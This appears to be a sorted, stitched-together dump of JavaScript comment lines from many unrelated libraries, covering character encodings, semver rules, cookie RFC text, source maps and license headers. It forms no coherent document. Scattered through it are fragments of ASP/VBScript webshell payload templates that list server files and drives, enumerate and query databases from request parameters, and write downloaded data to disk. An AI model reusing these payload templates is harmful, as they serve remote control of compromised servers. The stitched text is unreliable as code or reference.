"//                      ""::"" 5( h16 "":"" ) ls32"
"//                      , data: { satellites: 2, red: true }"
"//                      , data: { satellites: 3 }"
"//                     corresponds to this chunk of generated code,"
"//                0201-1976 Roman, 0208-1978, 0208-1983."
"//               0x8E, 0xA1-0xDF - upper part of 0201"
"//               0x8F, (0xA1-0xFE)x2 - 0212 plane (94x94)."
"//               Windows CP932 is a superset of Shift_JIS. Some companies added more chars, notably KDDI."
"//               chunk of code,"
"//               encoding of 0208. Lead byte ranges: 0x81-0x9F, 0xE0-0xEF; Trail byte ranges: 0x40-0x7E, 0x80-0x9E, 0x9F-0xFC."
"//              2 planes, first is superset of 0208, second - revised 0212."
"//              Has several variations in 1978, 1983, 1990 and 1997."
"//              Introduced in 2000, revised 2004. Some characters are in Unicode Plane 2 (0x2xxxx)"
"//              ret && ret.length,"
"//              rs.needReadable,"
"//             optional unsigned long byteOffset, optional unsigned long length)"
"//             optional unsigned long byteOffset,"
"//          $(""[href='#""+cid+""']"").addClass('active');"
"//          $(""[href='#""+pid+""']"").removeClass('active');"
"//          typeof /./ === ""function""; // => false in IE and Opera,"
"//         <= SEQ_START  -> index of the start of a character code sequence, in decodeTableSeq."
"//         <= SEQ_START  -> it's an index in encodeTableSeq, see below. The character starts a sequence."
"//        , key: 'name'"
"//        , message: 'Unique constraint violated for key name' }"
"//        <li class=""plum"">Plum</li>"
"//        curve.fromBigInteger(new BigInteger(x.toString(""hex""), 16)),"
"//        curve.fromBigInteger(new BigInteger(y.toString(""hex""), 16)));      "
"//       <li class=""apple"">Apple</li>"
"//       <li class=""orange"">Orange</li>"
"//       generatedColumn: The column number in the generated code,"
"//       generatedLine: The line number in the generated code,"
"//       icon: 'fa fa-edit',"
"//       icon: 'fa fa-plus-circle',"
"//       icon: 'fa fa-remove',"
"//       name: _[0],"
"//       size: _[2],"
"//       text: LANG['list']['menu']['add'],"
"//       text: LANG['list']['menu']['del'],"
"//       text: LANG['list']['menu']['edit'],"
"//       time: _[1],"
"//      <li class=""apple"">Apple</li>"
"//      <li class=""orange"">Orange</li>"
"//      <li class=""pear"">Pear</li>"
"//      <li class=""plum"">Plum</li>"
"//      element than the one we are searching for, so we return -1."
"//      element which is less than the one we are searching for, so we"
"//      this.P = new ECPointFp(curve,"
"//      var x = key.slice(1,bytes+1); // skip the 04 for uncompressed format"
"//     (c) 2009-2013 Jeremy Ashkenas, DocumentCloud Inc."
"//     (c) 2009-2015 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors"
"//     - If no C has a prerelease and the GT.semver tuple, return false"
"//     - If no C has a prerelease and the LT.semver tuple, return false"
"//     // 'http://localhost:4000/1000',"
"//     <div class=""healthy"">"
"//     <div class=""red-fruit"">"
"//     <li class=""apple"">Apple</li>"
"//     <li class=""orange"">Orange</li>"
"//     <li class=""plum"">Plum</li>"
"//     `...` DestructuringAssignmentTarget[Yield, Await]"
"//     base: 'SauceLabs',"
"//     browserName: 'internet explorer',"
"//     column: 1 },"
"//     column: 1,"
"//     column: 10 },"
"//     column: 10,"
"//     column: 20,"
"//     f1: [stats for file1],"
"//     f2: [stats for file2],"
"//     filtering by @media (screen? print?), layout for widths/heights"
"//     gradient: false,"
"//     label: `random\t(${LANG['list']['not_recommended']})`,"
"//     lastColumn: 19 },"
"//     lastColumn: 9 },"
"//     legend:{""template"":""#os#"",""marker"":{""type"":""square"",""width"":25,""height"":15}},"
"//     name: `encoder_${c}`,"
"//     ordering.  If two or more parameters share the same name, they"
"//     return toastr.error(ret.substr(9), LANG_T['error']);"
"//     single string by using an ""&"" character (ASCII code 38) as"
"//     this.getPath('test.json'),"
"//     toastr.error(LANG['delete']['error'](path, ret === '0' ? false : ret), LANG_T['error']);"
"//     toastr.success(LANG['delete']['success'](path), LANG_T['success']);"
"//     type: 'newcolumn',"
"//     type: 'radio',"
"//     value using an ""="" character (ASCII code 61) as a separator, even"
"//     value: 'random',"
"//     version: '8',"
"//     view: 'pie' ,"
"//     }, {"
"//     },"
"//    ""."" + X.slice(""name"".length), `package.json` ""exports"", [""node"", ""require""])"
"//    $(""#menu a"").anchorjump({ offset: -30 });"
"//    $(""#menu"").anchorjump({ for: 'a', offset: -30 });"
"//    ...,"
"//    17, 233, 146,  52, 155,  29,"
"//    27, 157, 107, 205, 187, 253,  75,  45,"
"//    43, 13, 123,  61, 203,"
"//    44,  94, 164, 192,  64, 103,"
"//    44, 94, 164, 192,  64, 103, 17, 233,"
"//    44, 94, 164, 193,  64, 103, 17, 233,"
"//    Hebrew, words ending with Kaf, Mem, Nun, Pe or Tsadi, should not end with"
"//    In the encoder, it might make sense to support encoding old PUA mappings to Big5 bytes seq-s."
"//    Plus, it has 4 combining sequences."
"//    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"//    `package.json` ""exports"", [""node"", ""require""]) defined in the ESM resolver."
"//    and including percent encoded variants, throw an Invalid Package Target error."
"//    console.log(_);     let farr = _.split(""#"");"
"//    distributed under the License is distributed on an ""AS IS"" BASIS,"
"//    encoded variants, throw an Invalid Module Specifier error."
"//    equal to the length of expansionKey, then"
"//    indication that the text is laid out ""naturally"" since the final letter"
"//    new URL(sourceURL, sourceMapURL).toString()"
"//    pack<Type>()   - take a number (interpreted as Type), output a byte array"
"//    that x-mac-hebrew texts are so rare, writing another model prober isn't"
"//    the line order is unimportant (In fact, for this implementation, even"
"//    unpack<Type>() - take a byte array, output a Type-like number"
"//   'defaults', 'rest', 'async' ]"
"//   * Removed unsupported features (destructuring, let, comprehensions...)."
"//   - Else if in prerelease mode, return false"
"//   - If C is only the ANY comparator, return true"
"//   - If EQ satisfies every C, return true"
"//   - If GT is >=, and GT.semver does not satisfy every C, return false"
"//   - If GT, and EQ does not satisfy GT, return true (null set)"
"//   - If GT.semver has a prerelease, and not in prerelease mode"
"//   - If GT.semver is lower than any > or >= comp in C, return false"
"//   - If LT is <=, and LT.semver does not satisfy every C, return false"
"//   - If LT, and EQ does not satisfy LT, return true (null set)"
"//   - If LT.semver is greater than any < or <= comp in C, return false"
"//   - getComputedStyle(): requires default stylesheet, cascading, inheritance,"
"//   - if in prerelease mode, return true"
"//   - support qop=""auth-int"" only"
"//   125, 75, 173, 155, 221,"
"//   146, 52, 155,  29, 235,  77, 59, 125"
"//   146, 52, 155,  29, 235,  77, 59, 125,"
"//   155,  29, 235,  77,  59, 125,  75, 173,"
"//   155,  93, 171, 141, 251, 189,  75, 237"
"//   155, 221,  43,  13, 123,  61, 203, 109,"
"//   155, 29, 235,  77,  59,"
"//   2. A string key was specified, but no value provided"
"//   235,  77,  59, 125"
"//   AssignmentRestProperty[Yield, Await] :"
"//   It does, however, support innerHTML"
"//   Line 4: An optional source root, useful for relocating source"
"//   [""node"", ""require""]) defined in the ESM resolver."
"//   \`id\` INT UNSIGNED AUTO_INCREMENT,"
"//   \`title\` VARCHAR(100) NOT NULL,"
"//   ], event);"
"//   _id: this.manager.opt['_id'],"
"//   anything checkLValPattern() supports, as well as default assignment"
"//   anything checkLValSimple() supports, as well as object and array"
"//   broadcastAddress: '192.168.1.191',"
"//   circle: '[Circular]',"
"//   column: 10,"
"//   column: 2,"
"//   column: null,"
"//   defined elsewhere, like import declarations or function/class identifiers."
"//   first  byte range: 0x81 -- 0x9f , 0xe0 -- 0xef"
"//   firstAddress: '192.168.1.129',"
"//   function Foo() {} var ____Class0Blah = mixin(Bar, Baz);"
"//   generatedColumn: 0,"
"//   generatedLine: 1,"
"//   generatedLine: 2,"
"//   grid.selectCell(idx, index);"
"//   icon: 2,"
"//   lastAddress: '192.168.1.190',"
"//   length: 64,"
"//   line: 2,"
"//   line: null,"
"//   loaded, or only the primary sheet?"
"//   method, but they are processing the call asynchronously and have _not_"
"//   numHosts: 62,"
"//   originalColumn: 0,"
"//   originalLine: 1,"
"//   originalLine: 2,"
"//   patterns, rest elements, and other constructs that may appear within an"
"//   request-host domain-matches the cookie's domain."""
"//   return this[_encoders[_index]](pwd, data);"
"//   second byte range: 0x40 -- 0x7e , 0xa1 -- 0xfe"
"//   second byte range: 0x40 -- 0x7e,  0x80 -- 0xfc"
"//   shift: 6,"
"//   some `R1, R2, ...`"
"//   state.decoder: streams2, specifically < 0.10.6"
"//   subnetMask: '255.255.255.192',"
"//   subnetMaskLength: 26,"
"//   tag_e = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // ""|<-"";"
"//   tag_s = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // ""->|"";"
"//   this.cache.set(cache_tag, JSON.stringify(data));"
"//   this.tree.callEvent('onClick', [id]);"
"//   toastr.error(""Not Support"", LANG_T[""error""]);"
"//   toastr.error((err instanceof Object) ? JSON.stringify(err) : String(err), LANG_T['error']);"
"//   toastr.error((typeof(err) === 'object') ? JSON.stringify(err) : String(err), LANG_T['error']);"
"//   toastr.error(LANG['delete']['error'](path, err), LANG_T['error']);"
"//   var __t, __p = '';"
"//   { line: 2,"
"//  ""a"": 1"
"//  'Expression': /\u0080-\uffff/,"
"//  (foo, bar);"
"//  * ""-&"" while in base64 is not allowed."
"//  * Base64 part is started by ""&"" instead of ""+"""
"//  * Big5-HKSCS (-2001, -2004, -2008). Hong Kong standard. "
"//  * Direct characters are 0x20-0x7E, except ""&"" (0x26)"
"//  * ISO2022-JP-2: Adds esc seq for GB2313-1980, KSX1001-1992, ISO8859-1, ISO8859-7."
"//  * ISO2022-JP-3: Adds esc seq for 0201-1976 Kana set, 0213-2000 Planes 1, 2."
"//  * ISO2022-JP: Stateful encoding, with escape sequences to switch between ASCII, "
"//  * In Base64, "","" is used instead of ""/"""
"//  * JIS X 208: 7-bit, direct encoding of 0208. Byte ranges: 0x21-0x7E (94 values). Uncommon."
"//  * Shift_JIS: Compatible with 0201, uses not defined chars in top half as lead bytes for double-byte"
"//  :matches(button, input, select, textarea, menuitem, optgroup, option)[disabled],"
"//  DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC, and either DOCUMENT_POSITION_PRECEDING or"
"//  Pluggable, initialized in high-level API below."
"//  This sets the individual value, and checks to see if all four"
"//  fragment : ""body"""
"//  host : ""2001:db8::7%en1"""
"//  host : ""example.com"","
"//  optgroup[disabled] > option),"
"//  path : ""/one/two.three"","
"//  port : 123,"
"//  query : ""q1=a1&q2=a2"","
"//  scheme : ""uri"","
"//  sub-parts are set.  If so, it sets the shorthand version and removes"
"//  this.PublicKey = Buffer.from(""04""+pubhex,""hex"");"
"//  userinfo : ""user:pass"","
"//  var pubhex = unstupid(this.P.getX().toBigInteger().toString(16),bytes*2)+unstupid(this.P.getY().toBigInteger().toString(16),bytes*2);"
"// !!bookmark[Buffer.from(editor.session.getValue()).toString('base64')],"
"// "" '"
"// "" + e.toString());"
"// "" o  The cookie-path is a prefix of the request-path, and the first"
"// """
"// ""&-"" -> ""&"""
"// ""&Err.Description):Else:Response.Write(""1""):End If`,"
"// ""&Err.Description):Err.Clear:Else:For Each F in FO.subfolders:Response.Write F.Name&chr(47)&chr(9)&FD(F.DateLastModified)&chr(9)&chr(48)&chr(9)&C.GetFolder(F.Path).attributes&chr(10):Next:For Each L in FO.files:Response.Write L.Name&chr(9)&FD(L.DateLastModified)&chr(9)&L.size&chr(9)&C.GetFile(L.Path).attributes&chr(10):Next:End If`,"
"// ""&Err.Description):Err.Clear:End If`,"
"// ""&Err.Description:"
"// ""&Err.Description:Else:S=""1"":End If:Response.Write(S)`,"
"// ""&Err.Description:Else:SI=""1"":End If:Response.Write(SI)`,"
"// ""&Err.Description:End If`,"
"// ""&Err.Description:Err.Clear:Else:S=Server.Mappath(""."")&chr(9):For Each D in C.Drives:S=S&D.DriveLetter&chr(58):Next:End If:Response.Write(S)`"
"// ""&Err.Description:Err.Clear:Else:SI=""[ADO DATABASE]""&chr(9):Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,"
"// ""&Err.Description:Err.Clear:Else:Set Rs=Conn.OpenSchema(20):Rs.MoveFirst:SI="""":Do While Not Rs.Eof:If Rs(""TABLE_TYPE"")=""TABLE"" Then:SI=SI&Rs(""TABLE_NAME"")&chr(9):End If:Rs.MoveNext:Loop:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,"
"// ""&Err.Description:Err.Clear:Else:Set Rs=CreateObject(""Adodb.Recordset""):Rs.open """"&bd(Request(""${arg2}""))&"""",Conn,1,1:If Err Then:SI=""ERROR:// ""&Err.Description:Err.Clear:Else:For n=0 To Rs.Fields.Count-1:SI=SI&Rs.Fields.Item(n).Name&"" (""&TN(Rs.Fields.Item(n).Type)&"")""&chr(9):Next:Rs.Close:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,"
"// ""&Err.Description:Err.Clear:Else:set s=CreateObject(""ADODB.Stream""):s.Mode=3:s.Type=1:s.Open():s.Write x.ResponseBody:s.SaveToFile """"&bd(Request(""${arg2}""))&"""",2:If Err Then:SI=""ERROR:// ""&Err.Description:Err.Clear:Else:SI=""1"":End If:Set x=Nothing:Set s=Nothing:End If:Response.Write(SI)`,"
"// ""&Err.Description:else:SI=""1"":End If:Response.Write(SI)`,"
"// ""&PT&Err.Description:Err.Clear:Else:SI=""1"":End If:Response.Write(SI)`,"
"// ""&amp;#38;"""
"// ""&amp;&num;38&semi;"""
"// ""+-"" -> ""+"""
"// ""+e.toString());"
"// ""+err.message);}Response.Write(""${tag_e.substr(0,tag_e.length/2)}""+""${tag_e.substr(tag_e.length/2)}"");Response.End();`;"
"// ""-3 minutes"""
"// ""-3m"""
"// ""->|"";"
"// ""..."""
"// "".example.com"""
"// ""1 minute"""
"// ""10 hours"""
"// ""10h"""
"// ""1m"""
"// ""2 minutes"""
"// ""2. If the uri-path is empty or if the first character of the uri-path is not"
"// ""2m"""
"// ""3. If the uri-path contains no more than one %x2F (""/"") character, output"
"// ""4. Output the characters of the uri-path from the first character up to,"
"// "":80"" portion is not on the produced URL"
"// ""Advance position by one character."""
"// ""Attribute values must be CSS identifiers [capture 5] or strings [capture 3 or capture 4]"""
"// ""Convert the cookie-domain to lower case."""
"// ""DIRECT"" connection, wait for connection confirmation"
"// ""DIRECT"""
"// ""Either:"
"// ""Extended"" (RFC 3659) commands"
"// ""Find the character pointed to by position in the first column of"
"// ""ISO-8859-8"" - Visual Hebrew"
"// ""ISO-8859-8-I"" - Logical Hebrew"
"// ""If buffer has accumulated 24 bits, interpret them as three 8-bit"
"// ""If buffer is not empty, it contains either 12 or 18 bits. If it"
"// ""If delta-seconds is less than or equal to zero (0), let expiry-time"
"// ""If the attribute-value failed to parse as a cookie date, ignore the"
"// ""If the attribute-value is empty, the behavior is undefined.  However,"
"// ""If the cookie's http-only-flag is true, then exclude the cookie if the"
"// ""If the cookie's secure-only-flag is true, then the request-uri's"
"// ""If the first character of the attribute-value is not a DIGIT or a ""-"""
"// ""If the length of input divides by 4 leaving a remainder of 1, throw an"
"// ""If the length of input divides by 4 leaving no remainder, then: if"
"// ""If the unparsed-attributes string is empty, skip the rest of these"
"// ""Let buffer be a buffer that can have bits appended to it, initially"
"// ""Let output be a string, initially empty."""
"// ""Max-Age="" non-zero-digit *DIGIT"
"// ""Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"""
"// ""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"""
"// ""Proprietary"" Interface."
"// ""Remove all space characters from input."""
"// ""Return output."""
"// ""Software""), to deal in the Software without restriction, including"
"// ""Standard"" (RFC 959) commands"
"// ""The SOCKS service is conventionally located on TCP port 1080"""
"// ""The btoa() method must throw an INVALID_CHARACTER_ERR exception if the"
"// ""The request-uri's path path-matches the cookie's path."""
"// ""Visual"" directionality means that the text is ordered as if the renderer is"
"// ""Whether an element is represented by a :lang() selector"
"// ""While position does not point past the end of input, run these"
"// ""[last word of first line spelled backwards] [whole line ordered backwards"
"// ""\"""
"// ""\\\\hostname\\path\\to\\the file.txt"""
"// ""anyone can guess my name"""
"// ""asyncStorage"""
"// ""c:\\WINDOWS\\clock.avi"""
"// ""c:\\path\\to\\the file.txt"""
"// ""constants"""
"// ""day-of-month = 1*2DIGIT ( non-digit *OCTET )"""
"// ""discard the first "";"" and trim""."
"// ""expand 32-byte k"""
"// ""expected"" way, so undefined is always cast to null in all"
"// ""file:///c|/tmp/test.txt"".  In some cases, the colon is left"
"// ""foo.js"".  Normalize these first so that future comparisons will succeed."
"// ""key1=value1; key2=value2; ..."""
"// ""mapping.generatedColumn"" with ""lastMapping"""
"// ""name"": intentionally not styling"
"// ""negative"" y so we can replace sub with am later"
"// ""non-digit = %x00-2F / %x3A-FF"""
"// ""o  The cookie-path and the request-path are identical."""
